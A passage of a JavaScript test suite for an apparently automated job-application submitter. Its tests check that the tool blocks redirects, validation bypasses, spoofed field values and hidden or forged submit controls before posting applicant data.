    }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 checks the exact URL again before every later applicant-data action', async () => {
  const { status, result, clicks: recorded } = await runV4('/url-hop-start', [
    { type: 'fill', selector: '#first-hop', value: 'first' },
    { type: 'waitForSelector', selector: '#wrong-ready', timeout: 5000 },
    { type: 'fill', selector: '#second-hop', value: 'must-not-land' }
  ]);
  assert.equal(status, 1);
  assert.equal(result, null);
  assert.deepEqual(recorded, []);
});

test('v4 checks the exact URL before chooser scanning or opt-in decline', async () => {
  const { status, result, clicks: recorded } = await runV4('/url-hop-start', [
    { type: 'fill', selector: '#first-hop', value: 'first' },
    { type: 'waitForSelector', selector: '#wrong-ready', timeout: 5000 }
  ]);
  assert.equal(status, 1);
  assert.equal(result, null);
  assert.deepEqual(recorded, []);
});

test('v4 rejects an initial navigation redirect before applicant actions', async () => {
  const { status, result, clicks: recorded, requests } = await runV4('/initial-redirect', [
    ...minimalV4Fills('#redirect-email', '#redirect-resume')
  ]);
  assert.equal(status, 1);
  assert.equal(result, null);
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
});

test('v4 native activation submits only the caller-bound real application endpoint', async () => {
  const { status, result, error, clicks: recorded, requests, screenshot } = await runV4(
    '/native-activation-normal',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(status, 0, JSON.stringify({ error, requests, screenshot }));
  assert.deepEqual(recorded, []);
  assert.equal(requests.length, 1);
  assertMultipartPost(requests[0], '/native-real', [
    multipartTextPart('email', 'applicant@example.com'),
    multipartFilePart('resume')
  ]);
  assert.equal(result.submitOutcome.pressed, true);
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(result.finalSubmitChooser.outcome, 'selected');
});

test('v4 Workable allowlist selector binds exactly one native application form', async () => {
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/workable-native-allowlist',
    [
      { type: 'fill', selector: '#workable-firstname', value: 'Mehek', label: 'first_name' },
      { type: 'fill', selector: '#workable-email', value: 'applicant@example.com', label: 'email' },
      {
        type: 'upload', selector: '#workable-resume', label: 'resume',
        file: {
          name: 'resume.pdf', mimeType: 'application/pdf',
          base64: Buffer.from('resume').toString('base64')
        }
      }
    ]
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.equal(requests.length, 1, JSON.stringify({ error, result, requests }));
  assertMultipartPost(requests[0], '/native-real', [
    multipartTextPart('firstname', 'Mehek'),
    multipartTextPart('email', 'applicant@example.com'),
    multipartFilePart('avatar', '', Buffer.alloc(0)),
    multipartFilePart('resume'),
    multipartTextPart('5854743', 'hackathon')
  ]);
  assert.equal(result.submitOutcome.pressed, true);
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(result.requiredFieldConfirmation.passes[0].scope.scopeKind, 'form');
  assert.equal(result.finalSubmitChooser.outcome, 'selected');
});

test('v4 blocks the same Workable checkbox question when no unique-name option is checked', async () => {
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/workable-native-allowlist-empty',
    [
      { type: 'fill', selector: '#workable-firstname', value: 'Mehek', label: 'first_name' },
      { type: 'fill', selector: '#workable-email', value: 'applicant@example.com', label: 'email' },
      {
        type: 'upload', selector: '#workable-resume', label: 'resume',
        file: {
          name: 'resume.pdf', mimeType: 'application/pdf',
          base64: Buffer.from('resume').toString('base64')
        }
      }
    ]
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.match(
    result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
    /Which development experience applies\?|Required application control "5854742" is empty/
  );
});

test('v4 rejects a native GET application form before any request', async () => {
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/native-get-unsupported',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
  assert.equal(result.finalSubmitChooser.outcome, 'transport_unsupported');
});

for (const validationBypass of [
  ['form novalidate', '/native-validation-novalidate'],
  ['submitter formnovalidate', '/native-validation-formnovalidate']
]) {
  test('v4 rejects native POST validation bypass through ' + validationBypass[0], async () => {
    const { status, result, error, clicks: recorded, requests } = await runV4(
      validationBypass[1],
      [
        ...minimalV4Fills('#native-email', '#native-resume'),
        { type: 'fill', selector: '#native-code', value: 'abc', label: 'applicant_code' }
      ]
    );
    assert.equal(status, 0, JSON.stringify(error));
    assert.deepEqual(recorded, []);
    assert.deepEqual(requests, []);
    assert.equal(result.submitOutcome.pressed, false);
    assert.equal(result.requiredFieldConfirmation.status, 'blocked');
    assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
    assert.equal(result.finalSubmitChooser.outcome, 'transport_unsupported');
  });
}

for (const constraintMutation of [
  ['pattern removal', '/native-constraint-pattern-removal', 'protected_surface_mutated'],
  ['setCustomValidity clear', '/native-constraint-custom-validity-clear', 'click_binding_changed']
]) {
  test('v4 rejects submit-time constraint mutation through ' + constraintMutation[0], async () => {
    const { status, result, error, clicks: recorded, requests } = await runV4(
      constraintMutation[1],
      [
        ...minimalV4Fills('#native-email', '#native-resume'),
        { type: 'fill', selector: '#native-code', value: 'abc', label: 'applicant_code' }
      ]
    );
    assert.equal(status, 0, JSON.stringify(error));
    assert.deepEqual(recorded, []);
    assert.deepEqual(requests, []);
    assert.equal(result.submitOutcome.pressed, false);
    assert.equal(result.requiredFieldConfirmation.status, 'blocked');
    assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, constraintMutation[2]);
    assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
  });
}

test('v4 blocks a POST-preserving 307 redirect after the caller-bound endpoint', async () => {
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/native-redirect-preserve-method',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.equal(requests.length, 1);
  assertMultipartPost(requests[0], '/native-redirect-307', [
    multipartTextPart('email', 'applicant@example.com'),
    multipartFilePart('resume')
  ]);
  assert.equal(result.submitOutcome.pressed, true);
  assert.equal(result.submitOutcome.transportDisposition, 'write_redirect_blocked');
  assert.equal(result.submitOutcome.observationDisposition, 'post_submit_observation_failed');
});

test('v4 allows a normal GET receipt redirect after the caller-bound POST', async () => {
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/native-redirect-receipt',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.equal(requests.length, 2);
  assertMultipartPost(requests[0], '/native-receipt-redirect', [
    multipartTextPart('email', 'applicant@example.com'),
    multipartFilePart('resume')
  ]);
  assert.deepEqual(requests[1], { method: 'GET', path: '/native-receipt', body: '' });
  assert.equal(result.submitOutcome.pressed, true);
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.match(result.url, /\/native-receipt$/);
});

test('v4 blocks receipt redirect userinfo before the descendant GET', async () => {
  const run = await runV4(
    '/native-redirect-userinfo-receipt',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.equal(run.requests.length, 1);
  assertMultipartPost(run.requests[0], '/native-receipt-userinfo-redirect', [
    multipartTextPart('email', 'applicant@example.com'),
    multipartFilePart('resume')
  ]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.submitOutcome.transportDisposition, 'receipt_redirect_blocked');
});

test('v4 preserves redirect cookies and the committed receipt URL through the pinned GET hop', async () => {
  const run = await runV4(
    '/native-redirect-cookie-receipt',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.equal(run.requests.length, 2);
  assertMultipartPost(run.requests[0], '/native-receipt-cookie-redirect', [
    multipartTextPart('email', 'applicant@example.com'),
    multipartFilePart('resume')
  ]);
  assert.deepEqual(run.requests[1], {
    method: 'GET',
    path: '/native-receipt-cookie',
    body: '',
    cookie: 'receipt_session=ready'
  });
  assert.match(run.result.url, /\/native-receipt-cookie$/);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
});

test('v4 strips the receipt fragment only from the pinned network hop and preserves it in page URL', async () => {
  const run = await runV4(
    '/native-redirect-fragment-receipt',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.equal(run.requests.length, 2);
  assertMultipartPost(run.requests[0], '/native-receipt-fragment-redirect', [
    multipartTextPart('email', 'applicant@example.com'),
    multipartFilePart('resume')
  ]);
  assert.deepEqual(run.requests[1], { method: 'GET', path: '/native-receipt', body: '' });
  assert.match(run.result.url, /\/native-receipt#done$/);
  assert.equal(run.result.submitOutcome.pressed, true);
});

for (const serializerCase of [
  {
    name: 'preserves field order with an empty file',
    fixture: '/native-serializer-empty-file',
    populateFile: false,
    body: 'email=applicant%40example.com&role=engineering&resume=&decision=apply',
    supported: true
  },
  {
    name: 'rejects a populated file',
    fixture: '/native-serializer-populated-file',
    populateFile: true,
    supported: false
  }
]) {
  test('v4 native urlencoded serializer ' + serializerCase.name, async () => {
    const { status, result, error, clicks: recorded, requests } = await runV4(
      serializerCase.fixture,
      nativeSerializerV4Fills(serializerCase.populateFile)
    );
    assert.equal(status, 0, JSON.stringify(error));
    assert.deepEqual(recorded, []);
    if (serializerCase.supported) {
      assert.deepEqual(requests, [{ method: 'POST', path: '/native-real', body: serializerCase.body }]);
      assert.equal(result.submitOutcome.pressed, true);
      assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
      assert.equal(result.finalSubmitChooser.outcome, 'selected');
    } else {
      assert.deepEqual(requests, []);
      assert.equal(result.submitOutcome.pressed, false);
      assert.equal(result.requiredFieldConfirmation.status, 'blocked');
      assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
      assert.equal(result.finalSubmitChooser.outcome, 'transport_unsupported');
    }
  });
}

test('v4 native multipart serializer preserves ordered fields and exact file bytes', async () => {
  const fileBytes = Buffer.from([0, 255, 1, 2, 13, 10, 128]);
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/native-multipart-serializer',
    [
      { type: 'fill', selector: '#multipart-email', value: 'applicant@example.com', label: 'email' },
      {
        type: 'upload',
        selector: '#multipart-resume',
        label: 'resume',
        file: {
          name: 'resume.pdf',
          mimeType: 'application/pdf',
          base64: fileBytes.toString('base64')
        }
      }
    ]
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.equal(requests.length, 1, JSON.stringify({ result, error, requests }, null, 2));
  assert.equal(requests[0].method, 'POST');
  assert.equal(requests[0].path, '/native-multipart-real');
  assert.deepEqual(recordedMultipartParts(requests[0]), [
    { name: 'email', bytesBase64: Buffer.from('applicant@example.com').toString('base64') },
    { name: 'role', bytesBase64: Buffer.from('engineering').toString('base64') },
    { name: 'role', bytesBase64: Buffer.from('security').toString('base64') },
    {
      name: 'resume',
      filename: 'resume.pdf',
      contentType: 'application/pdf',
      bytesBase64: fileBytes.toString('base64')
    },
    { name: 'decision', bytesBase64: Buffer.from('apply').toString('base64') }
  ]);
  assert.equal(result.submitOutcome.pressed, true);
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(result.finalSubmitChooser.outcome, 'selected');
});

test('v4 native multipart serializer preserves an empty file part', async () => {
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/native-multipart-serializer-empty',
    [{ type: 'fill', selector: '#multipart-email', value: 'applicant@example.com', label: 'email' }]
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.equal(requests.length, 1);
  assert.equal(requests[0].method, 'POST');
  assert.equal(requests[0].path, '/native-multipart-real');
  assert.deepEqual(recordedMultipartParts(requests[0]), [
    { name: 'email', bytesBase64: Buffer.from('applicant@example.com').toString('base64') },
    { name: 'role', bytesBase64: Buffer.from('engineering').toString('base64') },
    { name: 'role', bytesBase64: Buffer.from('security').toString('base64') },
    {
      name: 'resume',
      filename: '',
      contentType: 'application/octet-stream',
      bytesBase64: ''
    },
    { name: 'decision', bytesBase64: Buffer.from('apply').toString('base64') }
  ]);
  assert.equal(result.submitOutcome.pressed, true);
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(result.finalSubmitChooser.outcome, 'selected');
});

test('v4 binds an aria-label-only native choice to the exact outgoing value', async () => {
  const run = await runV4('/native-aria-label-choice-proof', [
    { type: 'fill', selector: '#aria-choice-email', value: 'applicant@example.com', label: 'email' },
    { type: 'fillByLabelText', text: 'Consent choice', value: 'Yes', label: 'consent' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, [{
    method: 'POST',
    path: '/native-integrity-real',
    body: 'email=applicant%40example.com&consent=1'
  }]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
});

test('v4 ignores an unselected named image submit control in native serialization', async () => {
  const run = await runV4('/native-unselected-image-control', [
    { type: 'fill', selector: '#image-control-email', value: 'applicant@example.com', label: 'email' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, [{
    method: 'POST',
    path: '/native-integrity-real',
    body: 'email=applicant%40example.com'
  }]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
});

test('v4 rejects URL userinfo in the native form action before any write', async () => {
  const run = await runV4('/native-userinfo-action', [
    { type: 'fill', selector: '#userinfo-email', value: 'applicant@example.com', label: 'email' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
  assert.equal(run.result.finalSubmitChooser.outcome, 'transport_unsupported');
});

test('v4 blocks same-metadata file-byte substitution despite page-realm crypto monkeypatches', async () => {
  const { status, result, error, clicks: recorded, requests } = await runV4(
    '/native-file-byte-substitution',
    [
      { type: 'fill', selector: '#integrity-email', value: 'applicant@example.com', label: 'email' },
      {
        type: 'upload',
        selector: '#integrity-resume',
        label: 'resume',
        file: {
          name: 'resume.pdf',
          mimeType: 'application/pdf',
          base64: Buffer.from('resume').toString('base64')
        }
      },
      { type: 'click', selector: '#mutate', label: 'review_attachment' }
    ]
  );
  assert.equal(status, 0, JSON.stringify(error));
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 binds retained file proof in the same native snapshot as transport serialization', async () => {
  const run = await runV4('/native-reversible-file-proof-swap', [
    { type: 'fill', selector: '#reversible-email', value: 'applicant@example.com', label: 'email' },
    {
      type: 'upload',
      selector: '#reversible-resume',
      label: 'resume',
      file: {
        name: 'resume.pdf',
        mimeType: 'application/pdf',
        base64: Buffer.from('resume').toString('base64')
      }
    },
    { type: 'click', selector: '#arm-swap', label: 'review_attachment' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
});

for (const spoofCase of [
  {
    name: 'text value getter spoofing',
    fixture: '/native-text-value-getter-spoof',
    actions: [{ type: 'fill', selector: '#spoof-email', value: 'applicant@example.com', label: 'email' }]
  },
  {
    name: 'select value getter spoofing',
    fixture: '/native-select-value-getter-spoof',
    actions: [{ type: 'select', selector: '#spoof-role', value: 'eng', label: 'role' }]
  }
]) {
  test('v4 blocks ' + spoofCase.name + ' from changing caller-intended payload', async () => {
    const run = await runV4(spoofCase.fixture, spoofCase.actions);
    assert.equal(run.status, 0, JSON.stringify(run.error));
    assert.deepEqual(run.requests, []);
    assert.equal(run.result.submitOutcome.pressed, false);
    assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
    assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
    assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
  });
}

test('v4 rejects textarea newline collapse instead of treating whitespace-different text as caller proof', async () => {
  const run = await runV4(
    '/native-textarea-whitespace-drift',
    [{ type: 'fill', selector: '#textarea-answer', value: 'Line one\nLine two', label: 'answer' }],
    [{ type: 'extract', selector: '#attempted' }]
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.equal(valueOf(run.result, '#attempted'), 'collapsed');
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 rejects hidden native choice label text plus an own value getter as caller authority', async () => {
  const run = await runV4(
    '/native-hidden-choice-label-spoof',
    [{
      type: 'fillByLabelText',
      text: 'Work authorization',
      value: 'Yes',
      label: 'work_authorization'
    }],
    [{ type: 'extract', selector: '#attempted' }]
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.equal(valueOf(run.result, '#attempted'), 'checked');
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 retains a failed legacy verifier write as an integrity blocker for explicit submit', async () => {
  const run = await runV4(
    '/native-legacy-verifier-write-drift',
    [{ type: 'fill', selector: '#legacy-email', value: 'applicant@example.com', label: 'email' }],
    [{ type: 'extract', selector: '#attempted' }]
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.equal(valueOf(run.result, '#attempted'), 'rewritten');
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 valid native POST survives earliest main-world primordial patches', async () => {
  const run = await runV4('/native-main-world-primordial-patches', [
    { type: 'fill', selector: '#primordial-email', value: 'applicant@example.com', label: 'email' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, [{
    method: 'POST',
    path: '/native-integrity-real',
    body: 'email=applicant%40example.com&capability_state=no'
  }]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(run.result.finalSubmitChooser.outcome, 'selected');
});

test('v4 does not count nameless controls as bare-Send authority', async () => {
  const run = await runV4('/native-nameless-proof-controls', [
    { type: 'fill', selector: '#nameless-first', value: 'Mehek', label: 'first_name' },
    { type: 'fill', selector: '#nameless-last', value: 'Mandal', label: 'last_name' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation, null);
  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(run.result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 rejects an extra caller-unintended value injected into a multiple select', async () => {
  const run = await runV4('/native-multi-select-injection', [
    { type: 'select', selector: '#multi-role', value: 'eng', label: 'role' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 treats a successful mutation without a pristine form-owner witness as an integrity failure', async () => {
  const run = await runV4('/native-form-owner-getter-spoof', [
    { type: 'fill', selector: '#spoof-owner-email', value: 'applicant@example.com', label: 'email' },
    {
      type: 'upload',
      selector: '#spoof-owner-resume',
      label: 'resume',
      file: {
        name: 'resume.pdf',
        mimeType: 'application/pdf',
        base64: Buffer.from('resume').toString('base64')
      }
    }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
});

test('v4 rejects an own innerText getter that forges Continue as Submit application', async () => {
  const run = await runV4(
    '/native-forged-submit-label',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
});

test('v4 chooser ignores hidden descendant text when the rendered control says Continue', async () => {
  const run = await runV4(
    '/native-hidden-submit-text',
    minimalV4Fills('#native-email', '#native-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
});

test('v4 rejects a final-looking native submit hidden by an opacity-zero ancestor', async () => {
  const run = await runV4('/native-opacity-zero-submit', [
    { type: 'fill', selector: '#opacity-email', value: 'applicant@example.com', label: 'email' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(run.result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 never auto-mutates an unproved opt-in through a forged decline value', async () => {
  const run = await runV4(
    '/native-optin-value-getter-spoof',
    minimalV4Fills('#optin-email', '#optin-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(run.result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 isolated scan catches an empty aria-required control hidden from page-world selectors', async () => {
  const run = await runV4(
    '/native-required-selector-spoof',
    minimalV4Fills('#required-email', '#required-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.match(
    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
    /Required application control "legal" is empty/
  );
});

test('v4 isolated scan catches an empty custom combobox hidden from page-world selectors', async () => {
  const run = await runV4(
    '/native-custom-required-selector-spoof',
    minimalV4Fills('#custom-required-email', '#custom-required-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.match(
    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
    /Required application control "required-department" is empty/
  );
});

test('v4 isolated scan rejects ARIA-only custom answers with no native payload backing', async () => {
  const run = await runV4(
    '/native-custom-required-aria-only',
    minimalV4Fills('#aria-only-email', '#aria-only-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.match(
    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
    /Required application control "aria-only-department" is empty/
  );
});

test('v4 isolated scan catches an empty control required only by a wrapping label class', async () => {
  const run = await runV4(
    '/native-required-class-marker-spoof',
    minimalV4Fills('#class-only-email', '#class-only-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.match(
    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
    /Required application control "class-only-answer" is empty/
  );
});

test('v4 isolated scan catches an empty control required only by a literal starred label', async () => {
  const run = await runV4(
    '/native-required-star-marker-spoof',
    minimalV4Fills('#star-only-email', '#star-only-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.match(
    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
    /Required application control "star-only-answer" is empty/
  );
});

test('v4 isolated scan fails closed on an unassociated literal starred label', async () => {
  const run = await runV4(
    '/native-required-unassociated-star-marker-spoof',
    minimalV4Fills('#star-sibling-email', '#star-sibling-resume')
  );
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.clicks, []);
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
  assert.match(
    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
    /Required application control "star-sibling-label" is empty/
  );
});

for (const parityCase of [
  ['a disabled checked radio peer', '/native-required-disabled-choice-peer'],
  ['an opposite-type checked peer', '/native-required-mixed-choice-peer'],
  ['a selected disabled option', '/native-required-disabled-option'],
  ['a selected option inside a disabled optgroup', '/native-required-disabled-optgroup'],
  ['a checked disabled peer under native radio requiredness', '/native-required-native-disabled-choice-peer'],
  ['a selected disabled option under native requiredness', '/native-required-native-disabled-option'],
  ['a disabled optgroup selection under native requiredness', '/native-required-native-disabled-optgroup'],
  ['an enabled selected option with an empty value', '/native-required-empty-option']
]) {
  test('v4 required scan rejects ' + parityCase[0] + ' as native payload evidence', async () => {
    const run = await runV4(
      parityCase[1],
      minimalV4Fills('#parity-email', '#parity-resume')
    );
    assert.equal(run.status, 0, JSON.stringify(run.error));
    assert.deepEqual(run.clicks, []);
    assert.deepEqual(run.requests, []);
    assert.equal(run.result.submitOutcome.pressed, false);
    assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
    assert.match(
      run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
      /Required application control "department" is empty/
    );
  });
}

test('v4 does not infer requiredness from a hidden descendant star', async () => {
  const run = await runV4('/native-optional-hidden-star', [
    { type: 'fill', selector: '#hidden-star-email', value: 'applicant@example.com', label: 'email' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, [{
    method: 'POST',
    path: '/native-integrity-real',
    body: 'email=applicant%40example.com&portfolio='
  }]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
});

test('v4 accepts a starred legend only when its coherent native radio group is answered', async () => {
  const run = await runV4('/native-starred-legend-answered', [
    { type: 'fill', selector: '#legend-email', value: 'applicant@example.com', label: 'email' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, [{
    method: 'POST',
    path: '/native-integrity-real',
    body: 'email=applicant%40example.com&department=engineering'
  }]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
});

test('v4 accepts a starred legend with one populated named native backing entry', async () => {
  const run = await runV4('/native-starred-legend-hidden-backing', [
    { type: 'fill', selector: '#legend-email', value: 'applicant@example.com', label: 'email' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, [{
    method: 'POST',
    path: '/native-integrity-real',
    body: 'email=applicant%40example.com&department=engineering'
  }]);
  assert.equal(run.result.submitOutcome.pressed, true);
  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
});

for (const ownerFailure of [
  ['/native-starred-legend-empty', 'starred-legend'],
  ['/native-custom-required-mixed-group', 'mixed-required-owner'],
